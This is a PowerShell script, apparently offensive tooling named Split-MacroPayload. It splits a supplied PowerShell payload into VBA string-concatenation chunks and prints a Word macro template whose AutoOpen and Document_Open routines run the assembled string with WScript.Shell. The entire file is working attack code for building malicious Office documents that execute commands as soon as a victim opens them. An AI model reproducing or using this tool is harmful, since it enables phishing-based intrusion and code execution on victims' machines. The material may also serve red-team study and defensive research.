Param(
    [string]$Payload,
    [int]$ChunkLength,
    [switch]$CopyPayloadToClipboard,
    [switch]$ShowMacroLayout
)
if(!$Payload -and !$ShowMacroLayout){
    Write-Host -ForegroundColor Yellow "[!] No arguments provided"
    Write-Host -ForegroundColor Yellow "[!] Usage is Split-MacroPayload [-Payload <POWERSHELL_PAYLOAD>] [-ChunkLength <CHARACTER_LENGTH>] [-CopyPayloadToClipboard] [-ShowMacroLayout]"
}
elseif($ShowMacroLayout){
$Macro_layout = @"
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String

    <PAYLOAD>

    CreateObject("Wscript.Shell").Run Str
End Sub
"@
    Write-Host -ForegroundColor Cyan "[*] Showing Macro Layout"
    Write-Output $Macro_layout
    Write-Host -ForegroundColor Green "[+] Macro Layout Generated"
}
elseif($Payload.Length -gt 8192){
    Write-Host -ForegroundColor Yellow "[!] Payload provided is over the allowed length of 8192 character"
}
else{
    if(!$ChunkLength){$ChunkLength = 255}
    Write-Host -ForegroundColor Cyan "[*] Generating Payload. Splitting in $ChunkLength character chunks"
    $Array = $Payload -split "(.{$ChunkLength})" | ? {$_}
    $Index = 1
    $Output = @()
    $Array | % {
        if ($Index -eq 1){
            $Output += "Str = `"$_`""
        }
        else{
            $Output += "Str = Str + `"$_`""
        }
        $index++
    }
    if(!$CopyPayloadToClipboard){
        Write-Output $Output
        Write-Host -ForegroundColor Green "[+] Payload generated successfully"
    }
    else{
        $Output | Set-Clipboard
        Write-Host -ForegroundColor Green "[+] Payload generated and sent to your clipboard"
    }
}